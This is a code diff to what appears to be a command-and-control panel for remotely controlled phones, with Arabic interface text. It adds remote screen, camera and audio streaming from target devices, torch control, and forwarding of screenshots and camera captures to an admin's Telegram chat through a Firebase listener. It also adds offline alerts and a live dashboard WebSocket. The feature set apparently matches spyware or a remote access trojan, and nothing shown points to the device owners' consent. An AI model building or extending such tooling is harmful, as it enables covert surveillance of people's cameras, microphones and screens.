+  startStreamPolling(devId);
+  if(_streamWaitingTimer)clearTimeout(_streamWaitingTimer);
+  _streamWaitingTimer=setTimeout(function(){if(_streamActive&&!_firstFrameReceived){_setViewerState('error');}},60000);
 }
-
 async function stopStream(){
-var devId=document.getElementById('streamDevice').value;
-if(!devId)return;
-api('stream/jpeg_stop',{method:'POST',body:JSON.stringify({device_id:devId})});
-_cleanupStream();
-notify('تم إيقاف البث');
+  var devId=document.getElementById('streamDevice').value;
+  if(!devId)return;
+  api('stream/jpeg_stop',{method:'POST',body:JSON.stringify({device_id:devId})});
+  _cleanupStream();
+  notify('Stream stopped');
 }
-
 function _cleanupStream(){
-_streamActive=false;_firstFrameReceived=false;_lastFrameData='';
-if(_streamPollTimer){clearInterval(_streamPollTimer);_streamPollTimer=null;}
-if(_streamWaitingTimer){clearTimeout(_streamWaitingTimer);_streamWaitingTimer=null;}
-if(_audioAnimFrame){cancelAnimationFrame(_audioAnimFrame);_audioAnimFrame=null;}
-document.getElementById('btnStartStream').style.display='';
-document.getElementById('btnStopStream').style.display='none';
-document.getElementById('btnSwitchCam').style.display='none';
-_setViewerState('idle');
-document.getElementById('stStatus').textContent='متوقف';
+  _streamActive=false;_firstFrameReceived=false;_lastFrameData='';
+  if(_streamPollTimer){clearInterval(_streamPollTimer);_streamPollTimer=null;}
+  if(_streamWaitingTimer){clearTimeout(_streamWaitingTimer);_streamWaitingTimer=null;}
+  if(_audioAnimFrame){cancelAnimationFrame(_audioAnimFrame);_audioAnimFrame=null;}
+  document.getElementById('btnStartStream').style.display='';
+  document.getElementById('btnStopStream').style.display='none';
+  document.getElementById('btnSwitchCam').style.display='none';
+  _setViewerState('idle');
+  document.getElementById('stStatus').textContent='Stopped';
 }
-
 async function switchCamera(){
-var devId=document.getElementById('streamDevice').value;
-if(!devId)return;
-if(_streamType==='front_camera') _streamType='back_camera';
-else if(_streamType==='back_camera') _streamType='front_camera';
-else _streamType='camera';
-if(_streamActive){stopStream();setTimeout(function(){startStream();},500);}
-else{startStream();}
-notify('تم تبديل الكاميرا');
+  var devId=document.getElementById('streamDevice').value;
+  if(!devId)return;
+  if(_streamType==='front_camera')_streamType='back_camera';
+  else if(_streamType==='back_camera')_streamType='front_camera';
+  else _streamType='camera';
+  if(_streamActive){stopStream();setTimeout(function(){startStream();},500);}
+  else{startStream();}
+  notify('Camera switched');
 }
-
 function _onFrameReceived(base64Data,isAudio){
-if(base64Data===_lastFrameData)return;
-_lastFrameData=base64Data;
-if(!_firstFrameReceived){_firstFrameReceived=true;if(_streamWaitingTimer){clearTimeout(_streamWaitingTimer);_streamWaitingTimer=null;}}
-_frameCount++;
-document.getElementById('stFrames').textContent=_frameCount;
-document.getElementById('stLastAct').textContent=new Date().toLocaleTimeString();
-if(isAudio){_setViewerState('receiving_audio');}
-else{_setViewerState('receiving_video');document.getElementById('streamImg').src='data:image/jpeg;base64,'+base64Data;}
+  if(base64Data===_lastFrameData)return;
+  _lastFrameData=base64Data;
+  if(!_firstFrameReceived){_firstFrameReceived=true;if(_streamWaitingTimer){clearTimeout(_streamWaitingTimer);_streamWaitingTimer=null;}}
+  _frameCount++;
+  document.getElementById('stFrames').textContent=_frameCount;
+  document.getElementById('stLastAct').textContent=new Date().toLocaleTimeString();
+  if(isAudio){_setViewerState('receiving_audio');}
+  else{_setViewerState('receiving_video');document.getElementById('streamImg').src='data:image/jpeg;base64,'+base64Data;}
 }
-
 function startStreamPolling(devId){
-if(_streamPollTimer)clearInterval(_streamPollTimer);
-_streamPollTimer=setInterval(async function(){
-if(!_streamActive)return;
-try{
-var typeParam=_streamType==='audio'?'audio':'video';
-var resp=await fetch('/api/stream/frame/'+devId+'?type='+typeParam,{headers:{'Authorization':'Bearer '+TOKEN}});
-var r=await resp.json();
-if(r.ok&&r.data&&r.data.length>50){_onFrameReceived(r.data,false);}
-else if(r.ok&&_firstFrameReceived){}
-else if(!_firstFrameReceived){
-try{var sr=await fetch('/api/stream/status',{headers:{'Authorization':'Bearer '+TOKEN}});var status=await sr.json();if(status.ok&&status.active_streams&&status.active_streams[devId]){if(!_firstFrameReceived)_setViewerState('connected');}else if(!_firstFrameReceived&&_streamActive){_setViewerState('waiting');}}catch(e){}
-}
-}catch(e){}
-},2000);
+  if(_streamPollTimer)clearInterval(_streamPollTimer);
+  _streamPollTimer=setInterval(async function(){
+    if(!_streamActive)return;
+    try{
+      var typeParam=_streamType==='audio'?'audio':'video';
+      var resp=await fetch('/api/stream/frame/'+devId+'?type='+typeParam,{headers:{'Authorization':'Bearer '+TOKEN}});
+      var r=await resp.json();
+      if(r.ok&&r.data&&r.data.length>50){_onFrameReceived(r.data,false);}
+      else if(r.ok&&_firstFrameReceived){}
+      else if(!_firstFrameReceived){
+        try{var sr=await fetch('/api/stream/status',{headers:{'Authorization':'Bearer '+TOKEN}});var status=await sr.json();if(status.ok&&status.active_streams&&status.active_streams[devId]){if(!_firstFrameReceived)_setViewerState('connected');}else if(!_firstFrameReceived&&_streamActive){_setViewerState('waiting');}}catch(e){}
+      }
+    }catch(e){}
+  },2000);
 }
 
 // Add streaming category to commands
-if(typeof CMD_CATEGORIES!=='undefined'){
-CMD_CATEGORIES.streaming={label:'📡 Streaming',cmds:['start_screen_stream','stop_screen_stream','start_camera_stream','stop_camera_stream','switch_camera','start_audio_stream','stop_audio_stream','get_stream_status','set_stream_quality','enable_torch','pause_stream','resume_stream','stop_all_streams','get_stream_capabilities']};
+CMD_CATEGORIES.streaming={label:'&#x1F4E1; Streaming',cmds:['start_screen_stream','stop_screen_stream','start_camera_stream','stop_camera_stream','switch_camera','start_audio_stream','stop_audio_stream','get_stream_status','set_stream_quality','enable_torch','pause_stream','resume_stream','stop_all_streams','get_stream_capabilities']};
 if(document.getElementById('cmdTabs')){
-var tabs=document.getElementById('cmdTabs');
-if(tabs.innerHTML.indexOf('Streaming')===-1){
-tabs.innerHTML+='<button class="tab" onclick="showCmdCat(\'streaming\',this)">📡 Streaming</button>';
-}
-}
+  var tabs=document.getElementById('cmdTabs');
+  if(tabs.innerHTML.indexOf('Streaming')===-1){
+    tabs.innerHTML+='<button class="tab" onclick="showCmdCat(\'streaming\',this)">&#x1F4E1; Streaming</button>';
+  }
 }
 </script>
 </body>
@@ -3575,18 +4523,26 @@ async def firebase_result_listener():
                         d = find_device(device_id)
                         dev_name = d.get("name", device_id) if d else device_id
 
+                        # Try to parse result as JSON for better formatting and image detection
+                        result_json_parsed = None
+                        b64_image = None
                         display_text = str(result_text) if result_text else "تم بنجاح"
                         if len(display_text) > 4000:
                             display_text = display_text[:4000] + "..."
 
-                        # Try to parse result as JSON for better formatting
                         try:
-                            result_json = json.loads(str(result_text))
-                            if isinstance(result_json, dict):
-                                if result_json.get("ok") and result_json.get("message"):
-                                    display_text = result_json["message"]
-                                elif result_json.get("ok") and result_json.get("data") is not None:
-                                    data = result_json["data"]
+                            result_json_parsed = json.loads(str(result_text))
+                            if isinstance(result_json_parsed, dict):
+                                # Check for base64 image in result (screenshots, cameras)
+                                for img_key in ("base64", "base64_preview", "image", "image_data"):
+                                    img_val = result_json_parsed.get(img_key, "")
+                                    if img_val and len(img_val) > 1000:
+                                        b64_image = img_val
+                                        break
+                                if result_json_parsed.get("ok") and result_json_parsed.get("message"):
+                                    display_text = result_json_parsed["message"]
+                                elif result_json_parsed.get("ok") and result_json_parsed.get("data") is not None:
+                                    data = result_json_parsed["data"]
                                     if isinstance(data, list):
                                         count = len(data)
                                         if count == 0:
@@ -3614,6 +4570,26 @@ async def firebase_result_listener():
                         else:
                             emoji = "\U0001f4cb"
 
+                        # Try to EDIT the pending message first (or send new)
+                        pending = _pending_messages.pop(cmd_id, None)
+                        batch_id = pending.get("batch_id") if pending else None
+
+                        # === Send image directly for screenshots/camera ===
+                        img_sent = False
+                        if b64_image and command in ("screenshot", "front_camera", "back_camera"):
+                            try:
+                                import base64 as _b64
+                                img_bytes = _b64.b64decode(b64_image)
+                                if len(img_bytes) > 5000:  # Only send if meaningful size
+                                    caption = f"{emoji} {dev_name} - {cmd_desc}"
+                                    photo_resp = await send_photo(ADMIN_CHAT_ID, img_bytes, caption=caption)
+                                    if photo_resp and photo_resp.get("ok"):
+                                        img_sent = True
+                                        log.info("Sent result as PHOTO: cmd=%s device=%s size=%d", cmd_id, device_id, len(img_bytes))
+                            except Exception as img_err:
+                                log.warning("Failed to send result as photo for cmd=%s: %s", cmd_id, img_err)
+
+                        # Build text message
                         msg = (
                             f"{emoji} <b>نتيجة الأمر</b>\n\n"
                             f"\U0001f4f1 الجهاز: <code>{dev_name}</code>\n"
@@ -3622,10 +4598,12 @@ async def firebase_result_listener():
                             f"<code>{display_text}</code>"
                         )
 
-                        # Try to EDIT the pending message first
-                        pending = _pending_messages.pop(cmd_id, None)
+                        # If image was sent, keep text shorter
+                        if img_sent:
+                            msg = f"{emoji} <b>{cmd_desc}</b>\n\U0001f4f1 <code>{dev_name}</code>\n\n<code>{display_text[:2000]}</code>"
+
                         msg_sent = False
-                        if pending:
+                        if pending and pending.get("message_id"):
                             try:
                                 edit_resp = await edit_message_text(
                                     pending["chat_id"], pending["message_id"],
@@ -3640,7 +4618,15 @@ async def firebase_result_listener():
                                 log.warning("Edit pending message error for cmd=%s: %s", cmd_id, edit_err)
                         
                         if not msg_sent:
-                            await send_admin(msg)
+                            # For batch ops, don't flood - just update counter
+                            if batch_id and batch_id in _batch_operations:
+                                _batch_operations[batch_id]["responded"] += 1
+                                await update_batch_progress(batch_id)
+                            else:
+                                await send_admin(msg)
+                        elif batch_id and batch_id in _batch_operations:
+                            _batch_operations[batch_id]["responded"] += 1
+                            await update_batch_progress(batch_id)
                         log.info("Result FORWARDED to Telegram: cmd=%s device=%s type=%s", cmd_id, device_id, command)
                     except Exception as send_err:
                         log.error("Failed to forward result to Telegram: %s", send_err)
@@ -3726,6 +4712,74 @@ async def firebase_result_listener():
             pass  # Don't let cleanup errors break the listener
 
         await asyncio.sleep(3)
+
+# ============================================================================
+# DEVICE MONITORING LOOP
+# ============================================================================
+
+async def device_monitoring_loop():
+    """Background task: Monitor device online/offline status by checking last_seen timestamps.
+    Detects devices that went offline without sending an explicit offline heartbeat."""
+    global _device_last_online_state
+    log.info("Device monitoring loop started")
+
+    # Initialize tracking state from existing devices on startup
+    await asyncio.sleep(10)  # Wait for devices to register
+    for d in get_devices():
+        did = d.get("id", "")
+        if did and did not in _device_last_online_state:
+            _device_last_online_state[did] = d.get("active", False)
+            log.info("Monitor: initialized %s as %s", did, "online" if d.get("active") else "offline")
+
+    while polling_active:
+        try:
+            now = time.time()
+            devices = get_devices()
+            for d in devices:
+                did = d.get("id", "")
+                if not did:
+                    continue
+                last_seen_str = d.get("last_seen", "")
+                is_active = d.get("active", False)
+
+                # Parse last_seen to check if device should be considered offline
+                try:
+                    last_seen_dt = datetime.strptime(last_seen_str, "%Y-%m-%d %H:%M:%S")
+                    last_seen_ts = last_seen_dt.timestamp()
+                    time_since_seen = now - last_seen_ts
+                except Exception:
+                    time_since_seen = 999999
+
+                # If device is marked active but hasn't been seen recently, mark offline
+                if is_active and time_since_seen > DEVICE_OFFLINE_TIMEOUT:
+                    update_device(did, {"active": False})
+                    # Trigger offline alert via state tracking
+                    was_online = _device_last_online_state.get(did, False)
+                    if was_online:
+                        _device_last_online_state[did] = False
+                        dev_name = d.get("name", did)
+                        try:
+                            await send_admin(
+                                f"🔴 <b>الجهاز غير متصل</b>\n\n"
+                                f"📱 {dev_name} (<code>{did}</code>)\n"
+                                f"⏱️ آخر ظهور: {last_seen_str}\n"
+                                f"🕐 {ts()}",
+                                disable_notification=True
+                            )
+                        except Exception:
+                            pass
+                        append_event("Device offline (timeout)", {"device_id": did})
+
+            # Cleanup stale batch operations (older than 10 minutes)
+            stale_batches = [k for k, v in _batch_operations.items() if now - v.get("created_at", 0) > 600]
+            for sb in stale_batches:
+                del _batch_operations[sb]
+
+        except Exception as exc:
+            log.error("Device monitoring error: %s", exc)
+
+        await asyncio.sleep(60)  # Check every 60 seconds
+
 
 # ============================================================================
 # SESSION CLEANUP TASK
@@ -4268,6 +5322,118 @@ def create_app():
     app.router.add_post("/api/stream/jpeg_start", api_jpeg_stream_start)
     app.router.add_post("/api/stream/jpeg_stop", api_jpeg_stream_stop)
 
+    # ========== DASHBOARD WEBSOCKET (Real-time Updates) ==========
+    _dashboard_ws_clients = set()
+
+    async def ws_dashboard(request):
+        """WebSocket endpoint for dashboard real-time updates - /ws/dashboard?token=xxx"""
+        ws = web.WebSocketResponse(heartbeat=30)
+        await ws.prepare(request)
+
+        # Authenticate via query param
+        token = request.query.get("token", "")
+        if not token or not validate_session(token):
+            await ws.close(code=4001, message="Unauthorized")
+            return ws
+
+        _dashboard_ws_clients.add(ws)
+        log.info("Dashboard WebSocket connected (total: %d)", len(_dashboard_ws_clients))
+        try:
+            # Send initial data
+            devices = get_devices()
+            cmds = load_json(COMMANDS_FILE, [])[-50:]
+            events = load_json(EVENTS_FILE, [])[-50:]
+            online = sum(1 for d in devices if d.get("active"))
+            pending = sum(1 for c in cmds if c.get("status") == "pending")
+            completed = sum(1 for c in cmds if c.get("status") == "completed")
+            initial = {
+                "type": "init",
+                "devices": devices,
+                "commands": cmds,
+                "events": events,
+                "stats": {
+                    "uptime": get_uptime(),
+                    "uptime_formatted": format_uptime(get_uptime()),
+                    "devices_total": len(devices),
+                    "devices_online": online,
+                    "commands_total": len(cmds),
+                    "commands_pending": pending,
+                    "commands_completed": completed,
+                    "messages_sent": messages_sent,
+                    "api_hits": api_hits,
+                    "events_total": len(events),
+                    "total_registered_commands": len(COMMAND_REGISTRY),
+                }
+            }
+            await ws.send_json(initial)
+
+            # Keep connection alive with periodic updates
+            async for msg in ws:
+                if msg.type == aiohttp.WSMsgType.TEXT:
+                    if msg.data == "ping":
+                        await ws.send_json({"type": "pong"})
+                elif msg.type in (aiohttp.WSMsgType.ERROR, aiohttp.WSMsgType.CLOSE):
+                    break
+        except Exception as exc:
+            log.debug("Dashboard WS error: %s", exc)
+        finally:
+            _dashboard_ws_clients.discard(ws)
+            log.info("Dashboard WebSocket disconnected (total: %d)", len(_dashboard_ws_clients))
+
+        return ws
+
+    async def broadcast_to_dashboards(message):
+        """Send a message to all connected dashboard WebSocket clients."""
+        if not _dashboard_ws_clients:
+            return
+        dead = set()
+        msg_str = json.dumps(message) if not isinstance(message, str) else message
+        for ws_conn in list(_dashboard_ws_clients):
+            try:
+                await ws_conn.send_str(msg_str)
+            except Exception:
+                dead.add(ws_conn)
+        _dashboard_ws_clients.difference_update(dead)
+
+    async def dashboard_push_loop():
+        """Background task: periodically push stats updates to connected dashboards."""
+        while True:
+            await asyncio.sleep(4)
+            if not _dashboard_ws_clients:
+                continue
+            try:
+                devices = get_devices()
+                cmds = load_json(COMMANDS_FILE, [])
+                events = load_json(EVENTS_FILE, [])
+                online = sum(1 for d in devices if d.get("active"))
+                pending = sum(1 for c in cmds if c.get("status") == "pending")
+                completed = sum(1 for c in cmds if c.get("status") == "completed")
+                stats_msg = {
+                    "type": "stats_update",
+                    "stats": {
+                        "uptime": get_uptime(),
+                        "uptime_formatted": format_uptime(get_uptime()),
+                        "devices_total": len(devices),
+                        "devices_online": online,
+                        "commands_total": len(cmds),
+                        "commands_pending": pending,
+                        "commands_completed": completed,
+                        "messages_sent": messages_sent,
+                        "api_hits": api_hits,
+                        "events_total": len(events),
+                        "total_registered_commands": len(COMMAND_REGISTRY),
+                    }
+                }
+                await broadcast_to_dashboards(stats_msg)
+            except Exception:
+                pass
+
+    app.router.add_get("/ws/dashboard", ws_dashboard)
+    # Store refs for the startup hook
+    app["_dashboard_ws_clients"] = _dashboard_ws_clients
+    app["_broadcast_to_dashboards"] = broadcast_to_dashboards
+    app["_dashboard_push_loop"] = dashboard_push_loop
+
     # Static files
     static_dir = Path(__file__).parent / "static"
     if static_dir.exists():
@@ -4300,6 +5466,11 @@ async def on_startup(app):
     app["cleanup_task"] = asyncio.create_task(session_cleanup_loop())
     # Start Firebase result listener
     app["fb_listener_task"] = asyncio.create_task(firebase_result_listener())
+    # Start device monitoring (online/offline alerts)
+    app["monitor_task"] = asyncio.create_task(device_monitoring_loop())
+    # Start dashboard WebSocket push loop
+    if app.get("_dashboard_push_loop"):
+        app["dashboard_push_task"] = asyncio.create_task(app["_dashboard_push_loop"]())
     
     # Notify admin
     try:
@@ -4323,6 +5494,8 @@ async def on_cleanup(app):
         app["cleanup_task"].cancel()
     if "fb_listener_task" in app:
         app["fb_listener_task"].cancel()
+    if "monitor_task" in app:
+        app["monitor_task"].cancel()
     global _tg_session
     if _tg_session and not _tg_session.closed:
         await _tg_session.close()
